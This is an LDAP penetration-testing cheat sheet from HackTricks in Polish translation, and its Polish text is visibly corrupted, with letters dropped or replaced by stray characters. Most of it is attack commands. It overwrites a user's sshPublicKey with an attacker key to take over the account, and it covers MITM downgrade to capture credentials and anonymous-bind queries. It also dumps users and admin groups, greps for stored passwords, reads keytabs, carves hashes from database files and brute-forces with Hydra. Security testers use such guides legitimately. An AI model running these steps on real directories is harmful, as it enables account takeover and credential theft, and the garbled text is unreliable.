# 389, 636, 3268, 3269 - Testowanie penetracyjne LDAP

<details>

<summary><strong>Zacznij od zera i sta si ekspertem od hakowania AWS dziki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

Zastosowanie **LDAP** (Lightweight Directory Access Protocol) polega g贸wnie na lokalizowaniu r贸偶nych jednostek, takich jak organizacje, jednostki i zasoby, takie jak pliki i urzdzenia w sieciach, zar贸wno publicznych, jak i prywatnych. Oferuje ono uproszczony spos贸b w por贸wnaniu z jego poprzednikiem, DAP, poprzez mniejszy lad kodowy.

Katalogi LDAP s zorganizowane w taki spos贸b, aby mo偶na je byo rozproszy na kilka serwer贸w, z ka偶dym serwerem przechowujcym **zreplikowan** i **zsynchronizowan** wersj katalogu, nazywan agentem systemu katalogowego (DSA). Odpowiedzialno za obsug 偶da le偶y wycznie po stronie serwera LDAP, kt贸ry mo偶e komunikowa si z innymi DSA w razie potrzeby, aby dostarczy zjednoczon odpowied藕 dla 偶dajcego.

Organizacja katalogu LDAP przypomina **hierarchi drzewa, zaczynajc od katalogu g贸wnego na g贸rze**. Gazie te prowadz do kraj贸w, kt贸re dalej dziel si na organizacje, a nastpnie na jednostki organizacyjne reprezentujce r贸偶ne dziay lub departamenty, docierajc w kocu do poziomu jednostek indywidualnych, obejmujcych zar贸wno osoby, jak i wsp贸dzielone zasoby, takie jak pliki i drukarki.

**Domylny port:** 389 i 636 (ldaps). Katalog globalny (LDAP w Active Directory) jest dostpny domylnie na portach 3268 i 3269 dla LDAPS.
```
PORT    STATE SERVICE REASON
389/tcp open  ldap    syn-ack
636/tcp open  tcpwrapped
```
### Format wymiany danych LDAP

LDIF (LDAP Data Interchange Format) definiuje zawarto katalogu jako zestaw rekord贸w. Mo偶e r贸wnie偶 reprezentowa 偶dania aktualizacji (Dodaj, Zmodyfikuj, Usu, Zmie nazw).
```bash
dn: dc=local
dc: local
objectClass: dcObject

dn: dc=moneycorp,dc=local
dc: moneycorp
objectClass: dcObject
objectClass: organization

dn ou=it,dc=moneycorp,dc=local
objectClass: organizationalUnit
ou: dev

dn: ou=marketing,dc=moneycorp,dc=local
objectClass: organizationalUnit
Ou: sales

dn: cn= ,ou= ,dc=moneycorp,dc=local
objectClass: personalData
cn:
sn:
gn:
uid:
ou:
mail: pepe@hacktricks.xyz
phone: 23627387495
```
* Linie 1-3 definiuj domen najwy偶szego poziomu local
* Linie 5-8 definiuj domen pierwszego poziomu moneycorp (moneycorp.local)
* Linie 10-16 definiuj 2 jednostki organizacyjne: dev i sales
* Linie 18-26 tworz obiekt domeny i przypisuj atrybuty z wartociami

## Zapisz dane

Zauwa偶, 偶e jeli mo偶esz modyfikowa wartoci, mo偶esz wykona naprawd interesujce akcje. Na przykad, wyobra藕 sobie, 偶e **mo偶esz zmieni informacje "sshPublicKey"** swojego u偶ytkownika lub dowolnego u偶ytkownika. Bardzo prawdopodobne jest, 偶e jeli ten atrybut istnieje, to **ssh odczytuje klucze publiczne z LDAP**. Jeli mo偶esz zmodyfikowa klucz publiczny u偶ytkownika, **bdziesz m贸g zalogowa si jako ten u偶ytkownik nawet jeli uwierzytelnianie hasem nie jest wczone w ssh**.
```bash
# Example from https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
>>> import ldap3
>>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
>>> connection.bind()
True
>>> connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
```
## Przechwytywanie czystych danych uwierzytelniajcych

Jeli LDAP jest u偶ywany bez SSL, mo偶esz **przechwyci dane uwierzytelniajce w postaci zwykego tekstu** w sieci.

Mo偶esz r贸wnie偶 przeprowadzi atak **MITM** w sieci **pomidzy serwerem LDAP a klientem.** Tutaj mo偶esz przeprowadzi **Atak Downgrade**, aby klient u偶y **danych uwierzytelniajcych w postaci zwykego tekstu** do logowania.

**Jeli jest u偶ywane SSL**, mo偶esz spr贸bowa przeprowadzi **MITM** jak wy偶ej wspomniano, oferujc **faszywy certyfikat**, jeli **u偶ytkownik go zaakceptuje**, mo偶esz dokona Zdegradowania metody uwierzytelniania i ponownie zobaczy dane uwierzytelniajce.

## Dostp anonimowy

### Ominicie sprawdzania TLS SNI

Zgodnie z [**tym opisem**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) po prostu uzyskujc dostp do serwera LDAP za pomoc dowolnej nazwy domeny (np. company.com) by w stanie skontaktowa si z usug LDAP i wydoby informacje jako anonimowy u偶ytkownik:
```bash
ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```
### Bezpieczne wizania LDAP

[Bezpieczne wizania LDAP](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled) pozwalaj **nieuwierzytelnionym atakujcym** na pobieranie informacji z domeny, takich jak pena lista u偶ytkownik贸w, grup, komputer贸w, atrybut贸w kont u偶ytkownik贸w i zasad dotyczcych hasa domeny. Jest to **konfiguracja dziedziczna**, a od systemu Windows Server 2003 tylko uwierzytelnieni u偶ytkownicy mog inicjowa 偶dania LDAP.\
Jednak administratorzy mogli potrzebowa **skonfigurowa okrelon aplikacj, aby umo偶liwi anonimowe wizania** i udzieli wikszego dostpu ni偶 zamierzony, co umo偶liwio nieuwierzytelnionym u偶ytkownikom dostp do wszystkich obiekt贸w w AD.

## Wa偶ne Dane Logowania

Jeli masz wa偶ne dane logowania do logowania si do serwera LDAP, mo偶esz wydoby wszystkie informacje o Administratorze domeny za pomoc:

[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
```bash
pip3 install ldapdomaindump
ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
```
### [Atak siowy](../generic-methodologies-and-resources/brute-force.md#ldap)

## Wyliczanie

### Zautomatyzowane

Dziki temu bdziesz w stanie zobaczy **publiczne informacje** (takie jak nazwa domeny)**:**
```bash
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
```
### Python

<details>

<summary>Zobacz wyliczanie LDAP za pomoc Pythona</summary>

Mo偶esz spr贸bowa **wyliczy LDAP z lub bez powiadcze za pomoc Pythona**: `pip3 install ldap3`

Najpierw spr贸buj **poczy si bez** powiadcze:
```bash
>>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
```
Jeli odpowied藕 jest `True`, jak w poprzednim przykadzie, mo偶esz uzyska pewne **interesujce dane** serwera LDAP (takie jak **kontekst nazw** lub **nazwa domeny**) z:
```bash
>>> server.info
DSA info (from DSE):
Supported LDAP versions: 3
Naming contexts:
dc=DOMAIN,dc=DOMAIN
```
Gdy ju偶 masz kontekst nazewnictwa, mo偶esz wykona kilka bardziej ekscytujcych zapyta. To proste zapytanie powinno pokaza Ci wszystkie obiekty w katalogu:
```bash
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
>> connection.entries
```
Albo **wydrukuj** cae ldap:
```bash
>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
>>> connection.entries
```
</details>

### windapsearch

[**Windapsearch**](https://github.com/ropnop/windapsearch) to skrypt napisany w jzyku Python, kt贸ry jest przydatny do **wyliczenia u偶ytkownik贸w, grup i komputer贸w z domeny Windows**, wykorzystujc zapytania LDAP.
```bash
# Get computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
# Get groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
# Get users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Domain Admins
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Privileged Users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users
```
### ldapsearch

Sprawd藕 puste powiadczenia lub czy Twoje powiadczenia s poprawne:
```bash
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```bash
# CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
tion a successful bind must be completed on the connection., data 0, v3839
```
Jeli znajdziesz co m贸wicego, 偶e "_bind musi zosta ukoczony_", oznacza to, 偶e powiadczenia s nieprawidowe.

Mo偶esz wydoby **wszystko z domeny** u偶ywajc:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```
Wydobd藕 **u偶ytkownik贸w**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
#Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"
```
Wydoby **komputery**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Wydoby **moje informacje**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Wydobywanie **Domain Admins**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Wydobd藕 **U偶ytkownik贸w domeny**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Wydobywanie **Enterprise Admins**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Wycignij **Administrator贸w**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
### Wyodrbnianie grupy zdalnego pulpitu:

```plaintext
Remote Desktop Users
```
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Aby sprawdzi, czy masz dostp do jakiegokolwiek hasa, mo偶esz u偶y polecenia grep po wykonaniu jednego z zapyta:
```bash
<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
```
#### pbis

Mo偶esz pobra **pbis** std: [https://github.com/BeyondTrust/pbis-open/](https://github.com/BeyondTrust/pbis-open/) i zazwyczaj jest instalowany w `/opt/pbis`.\
**Pbis** pozwala atwo uzyska podstawowe informacje:
```bash
#Read keytab file
./klist -k /etc/krb5.keytab

#Get known domains info
./get-status
./lsa get-status

#Get basic metrics
./get-metrics
./lsa get-metrics

#Get users
./enum-users
./lsa enum-users

#Get groups
./enum-groups
./lsa enum-groups

#Get all kind of objects
./enum-objects
./lsa enum-objects

#Get groups of a user
./list-groups-for-user <username>
./lsa list-groups-for-user <username>
#Get groups of each user
./enum-users | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do ./list-groups-for-user "$name"; echo -e "========================\n"; done

#Get users of a group
./enum-members --by-name "domain admins"
./lsa enum-members --by-name "domain admins"
#Get users of each group
./enum-groups | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do echo "$name"; ./enum-members --by-name "$name"; echo -e "========================\n"; done

#Get description of each user
./adtool -a search-user --name CN="*" --keytab=/etc/krb5.keytab -n <Username> | grep "CN" | while read line; do
echo "$line";
./adtool --keytab=/etc/krb5.keytab -n <username> -a lookup-object --dn="$line" --attr "description";
echo "======================"
done
```
## Interfejs graficzny

### Katalog Apache

[**Pobierz Apache Directory std**](https://directory.apache.org/studio/download/download-linux.html). Mo偶esz znale藕 [przykad u偶ycia tego narzdzia tutaj](https://www.youtube.com/watch?v=VofMBg2VLnw\&t=3840s).

### jxplorer

Mo偶esz pobra interfejs graficzny z serwerem LDAP std: [http://www.jxplorer.org/downloads/users.html](http://www.jxplorer.org/downloads/users.html)

Domylnie jest zainstalowany w: _/opt/jxplorer_

![](<../.gitbook/assets/image (482).png>)

### Godap

Mo偶esz uzyska do niego dostp tutaj: [https://github.com/Macmod/godap](https://github.com/Macmod/godap)

## Autoryzacja za pomoc kerberosa

Korzystajc z `ldapsearch` mo偶esz **uwierzytelni** si za pomoc **kerberosa zamiast** przez **NTLM**, u偶ywajc parametru `-Y GSSAPI`

## POST

Jeli masz dostp do plik贸w, w kt贸rych znajduj si bazy danych (mog by w _/var/lib/ldap_). Mo偶esz wydoby hashe za pomoc:
```bash
cat /var/lib/ldap/*.bdb | grep -i -a -E -o "description.*" | sort | uniq -u
```
### Pliki konfiguracyjne

* Og贸lne
* containers.ldif
* ldap.cfg
* ldap.conf
* ldap.xml
* ldap-config.xml
* ldap-realm.xml
* slapd.conf
* Serwer IBM SecureWay V3
* V3.sas.oc
* Serwer Microsoft Active Directory
* msadClassesAttrs.ldif
* Serwer katalogowy Netscape Directory Server 4
* nsslapd.sas\_at.conf
* nsslapd.sas\_oc.conf
* Serwer katalogowy OpenLDAP
* slapd.sas\_at.conf
* slapd.sas\_oc.conf
* Serwer katalogowy Sun ONE Directory Server 5.1
* 75sas.ldif
```
Protocol_Name: LDAP    #Protocol Abbreviation if there is one.
Port_Number:  389,636     #Comma separated if there is more than one.
Protocol_Description: Lightweight Directory Access Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for LDAP
Note: |
The use of LDAP (Lightweight Directory Access Protocol) is mainly for locating various entities such as organizations, individuals, and resources like files and devices within networks, both public and private. It offers a streamlined approach compared to its predecessor, DAP, by having a smaller code footprint.

https://book.hacktricks.xyz/pentesting/pentesting-ldap

Entry_2:
Name: Banner Grab
Description: Grab LDAP Banner
Command: nmap -p 389 --script ldap-search -Pn {IP}

Entry_3:
Name: LdapSearch
Description: Base LdapSearch
Command: ldapsearch -H ldap://{IP} -x

Entry_4:
Name: LdapSearch Naming Context Dump
Description: Attempt to get LDAP Naming Context
Command: ldapsearch -H ldap://{IP} -x -s base namingcontexts

Entry_5:
Name: LdapSearch Big Dump
Description: Need Naming Context to do big dump
Command: ldapsearch -H ldap://{IP} -x -b "{Naming_Context}"

Entry_6:
Name: Hydra Brute Force
Description: Need User
Command: hydra -l {Username} -P {Big_Passwordlist} {IP} ldap2 -V -f
```
<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF** sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na githubie.

</details>
